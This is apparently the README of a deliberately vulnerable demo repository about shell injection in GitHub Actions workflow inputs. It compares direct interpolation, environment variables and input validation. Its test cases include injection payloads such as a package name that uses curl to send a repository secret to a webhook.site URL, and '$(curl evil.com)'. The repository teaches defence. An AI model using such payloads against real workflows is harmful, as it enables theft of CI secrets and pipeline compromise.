# GitHub Actions Shell Injection Vulnerability Demo

This repository demonstrates a **real and exploitable** GitHub Actions security vulnerability: **Shell Injection via untrusted inputs**.

## ⚠️ WARNING

This repository contains **intentionally vulnerable** code for educational purposes. **DO NOT** use these patterns in production!

---

## What is the Vulnerability?

GitHub Actions allows workflows to be triggered with user-provided inputs (`workflow_dispatch`). When these inputs are used **directly** in `run:` steps with the `${{ }}` syntax, they can inject arbitrary shell commands.

### The Two Patterns

```yaml
# Pattern 1: Direct interpolation (VULNERABLE)
run: git checkout -b "update-${{ inputs.package_name }}"

# Pattern 2: Using env vars (SAFER - GitHub's official recommendation)
run: git checkout -b "update-${PACKAGE_NAME}"
env:
  PACKAGE_NAME: ${{ inputs.package_name }}
```

### The Key Difference

**Direct `${{ }}` interpolation:**
- GitHub Actions evaluates expressions at **workflow generation time**
- The value becomes **part of the shell script itself**
- Command injection succeeds because the shell interprets special characters

**Environment variables (`env:`):**
- GitHub Actions sets the variable before script execution
- The value is **stored in memory as data**, not script
- The shell treats it as a string, preventing most injection attacks

**Source:** [GitHub Docs - Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)

---

## Important Findings

### ✅ Environment Variables DO Provide Security Benefits

After testing and reviewing GitHub's official documentation:

1. **GitHub officially recommends** using environment variables as a security control
2. **It does prevent** direct command injection in most cases
3. **But it's not sufficient alone** - input validation is still required

### ⚠️ Both Approaches Are Still Needed

**Best practice (from GitHub):**
```yaml
# Step 1: Validate input
- name: Validate Package Name
  run: |
    if ! echo "$PACKAGE_NAME" | grep -qE '^@?[a-zA-Z0-9_-]+(/[a-zA-Z0-9_-]+)?$'; then
      echo "Invalid package name"
      exit 1
    fi
  env:
    PACKAGE_NAME: ${{ inputs.package_name }}

# Step 2: Use validated input safely
- name: Install Package
  run: npm install "$PACKAGE_NAME"
  env:
    PACKAGE_NAME: ${{ inputs.package_name }}
```

**Why both?**
- Environment variables prevent script generation attacks
- Input validation rejects malicious patterns before any processing
- Defense-in-depth: multiple layers of security

---

## Demonstration Workflows

This repository contains three workflows:

### 1. `vulnerable.yml` - Direct Interpolation (VULNERABLE)
Uses `${{ inputs.* }}` directly in shell commands. Command injection succeeds.

### 2. `ineffective-fix.yml` - Environment Variables Only (IMPROVED BUT INCOMPLETE)
Uses environment variables without validation. **Significantly safer** than direct interpolation, but still missing input validation.

### 3. `secure.yml` - Complete Security Fix (SECURE)
Uses **both** environment variables **and** input validation. This is the proper defense-in-depth approach.

---

## Setup

### Configure GitHub Secrets

The workflows use GitHub repository secrets for demonstration purposes. Set these up:

1. Go to **Settings** → **Secrets and variables** → **Actions**
2. Click **New repository secret**
3. Add two secrets:

**Secret 1:**
- Name: `DEMO_SECRET`
- Value: `super-secret-api-key-12345`

**Secret 2:**
- Name: `DEMO_AWS_KEY`
- Value: `AKIAIOSFODNN7EXAMPLE`

These are fake secrets for demonstration only. The workflows will use them to show how secrets can be exfiltrated.

---

## How to Test the Vulnerability

### Prerequisites
- GitHub secrets configured (see Setup section above)
- A webhook URL from https://webhook.site for testing
- Access to this repository's Actions tab

### Test Case 1: Direct Interpolation (Vulnerable)

**Workflow:** `vulnerable.yml`

**Package name:**
```
$(curl https://webhook.site/YOUR-WEBHOOK-ID?secret=$DEMO_SECRET)
```

**Package version:**
```
1.0.0
```

**Expected result:**
- ✅ Command executes (you'll see curl progress in logs)
- ✅ Webhook receives request with secret
- ✅ Proves the vulnerability is exploitable

### Test Case 2: Environment Variables Without Validation

**Workflow:** `ineffective-fix.yml`

**Package name:**
```
$(curl https://webhook.site/YOUR-WEBHOOK-ID?test=envvar)
```

**Package version:**
```
1.0.0
```

**Expected result:**
- ❌ Command substitution does NOT execute
- ❌ No webhook request received
- ✅ Proves environment variables provide protection

**However:** This workflow still lacks input validation, which is required for complete security.

### Test Case 3: Complete Security (Environment Variables + Validation)

**Workflow:** `secure.yml`

**Package name:**
```
$(curl https://webhook.site/YOUR-WEBHOOK-ID?blocked=true)
```

**Package version:**
```
1.0.0
```

**Expected result:**
- ❌ Workflow fails at validation step
- ❌ No commands execute
- ❌ No webhook request
- ✅ Malicious input rejected before any processing

### Test Case 4: Valid Input Still Works

**Workflow:** `secure.yml`

**Package name:**
```
@prefect/ui-library
```

**Package version:**
```
2.1.3
```

**Expected result:**
- ✅ Validation passes
- ✅ Workflow completes successfully
- ✅ Legitimate use case works as expected

---

## Understanding the Results

### Why Direct Interpolation Fails

```yaml
run: git checkout -b "update-${{ inputs.package_name }}"
```

**With input:** `$(curl evil.com)`

**GitHub evaluates to:**
```bash
git checkout -b "update-$(curl evil.com)"
```

**Shell sees command substitution and executes:** `curl evil.com`

---

### Why Environment Variables Help

```yaml
run: git checkout -b "update-${PACKAGE_NAME}"
env:
  PACKAGE_NAME: ${{ inputs.package_name }}
```

**With input:** `$(curl evil.com)`

**GitHub sets:** `PACKAGE_NAME=$(curl evil.com)` (as a literal string)

**Shell expands:** Variable value is already set, treats it as string data

**Result:** Git receives the literal string `$(curl evil.com)` as the branch name, which it rejects as invalid. **No command execution.**

From GitHub's documentation:
> "The value of the expression is stored in memory and used as a variable, and doesn't interact with the script generation process."

---

### Why Validation Is Still Required

Even with environment variables:
1. **Variable expansion leaks** - Input like `leaked-${DEMO_SECRET}` may expose secrets in error messages
2. **Downstream processing** - Other tools might interpret the input differently
3. **Defense-in-depth** - Multiple security layers are always better
4. **Explicit rejection** - Invalid input should fail fast with clear error messages

---

## Comparison Matrix

| Approach | Direct `${{}}` | Env Vars Only | Env Vars + Validation |
|----------|----------------|---------------|-----------------------|
| Command injection | ❌ Vulnerable | ✅ Protected | ✅ Protected |
| Input validation | ❌ None | ❌ None | ✅ Enforced |
| Secret leaks | ⚠️ High risk | ⚠️ Some risk | ✅ Minimal risk |
| Clear error messages | ❌ No | ❌ No | ✅ Yes |
| **Security Rating** | 🔴 Vulnerable | 🟡 Improved | 🟢 Secure |

---

## Real-World Impact

This vulnerability allows attackers to:

1. **Steal secrets** - Access `GITHUB_TOKEN`, AWS keys, API tokens
2. **Push malicious code** - Use stolen tokens to commit backdoors
3. **Access private repositories** - Clone and exfiltrate source code
4. **Compromise CI/CD pipeline** - Poison build artifacts
5. **Lateral movement** - Use stolen credentials for further attacks

**This is a CRITICAL security issue when using direct interpolation.**

---

## The Correct Fix: Defense in Depth

### Step 1: Use Environment Variables

Follow GitHub's official recommendation to prevent script generation attacks:

```yaml
env:
  PACKAGE_NAME: ${{ inputs.package_name }}
run: npm install "$PACKAGE_NAME"
```

### Step 2: Add Input Validation

Whitelist allowed characters and formats:

```yaml
- name: Validate Input
  run: |
    if ! echo "$PACKAGE_NAME" | grep -qE '^@?[a-zA-Z0-9_-]+(/[a-zA-Z0-9_-]+)?$'; then
      echo "❌ Invalid package name: $PACKAGE_NAME"
      exit 1
    fi
  env:
    PACKAGE_NAME: ${{ inputs.package_name }}
```

### Step 3: Use Both Together

```yaml
- name: Validate Package Name
  run: |
    if ! echo "$PKG" | grep -qE '^@?[a-zA-Z0-9_-]+(/[a-zA-Z0-9_-]+)?$'; then
      echo "❌ Invalid package name"
      exit 1
    fi
  env:
    PKG: ${{ inputs.package_name }}

- name: Install Package (Safe)
  run: npm install "$PKG"
  env:
    PKG: ${{ inputs.package_name }}
```

---

## Alternative Secure Solutions

### Option 1: Use `actions/github-script`

Avoid shell entirely by using JavaScript:

```yaml
- uses: actions/github-script@v7
  with:
    script: |
      const { exec } = require('@actions/exec');
      await exec.exec('npm', ['install', context.payload.inputs.package_name]);
```

**Why it's secure:** Arguments passed as array, no shell interpretation.

### Option 2: Restrict Workflow Triggers

Only allow trusted users to trigger workflows:
- Use branch protection rules
- Require CODEOWNERS approval
- Don't expose `workflow_dispatch` to untrusted contributors

---

## Key Takeaways

### ✅ What Works

1. **Environment variables** - GitHub's official security recommendation
2. **Input validation** - Whitelist allowed patterns
3. **Both together** - Defense-in-depth approach
4. **Safe APIs** - Use `actions/github-script` when possible

### ❌ What Doesn't Work

1. **Direct interpolation alone** - Highly vulnerable
2. **Trusting user input** - Always validate
3. **Relying on one control** - Use multiple security layers

### 🎯 The Bottom Line

- **Direct `${{ }}` interpolation is vulnerable** ❌
- **Environment variables provide documented protection** ✅
- **Input validation is still required** ✅
- **Use both for complete security** ✅✅

---

## Testing Checklist

Run each test case and verify results:

- [ ] **Test 1:** Direct interpolation (`vulnerable.yml`) → Secret exfiltrated ❌
- [ ] **Test 2:** Env vars only (`ineffective-fix.yml`) → Injection blocked ✅
- [ ] **Test 3:** Complete fix (`secure.yml`) + malicious input → Input rejected ✅
- [ ] **Test 4:** Complete fix (`secure.yml`) + valid input → Workflow succeeds ✅

---

## References

- [GitHub Docs: Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
- [GitHub Docs: Secure Use Reference](https://docs.github.com/en/actions/reference/security/secure-use)
- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

---

## Questions?

**Q: Is direct interpolation always vulnerable?**
A: Yes, when using untrusted input with `${{ }}` syntax directly in `run:` steps.

**Q: Do environment variables completely fix the issue?**
A: They provide significant protection but input validation is still required for complete security.

**Q: Why do some SAST tools say environment variables don't help?**
A: Some tools may have outdated guidance. GitHub's official documentation confirms environment variables are a recommended security control.

**Q: Should I use both environment variables AND validation?**
A: Yes! Defense-in-depth is always the best approach.

---

## License

MIT - Use this for educational purposes. Always follow security best practices in production!
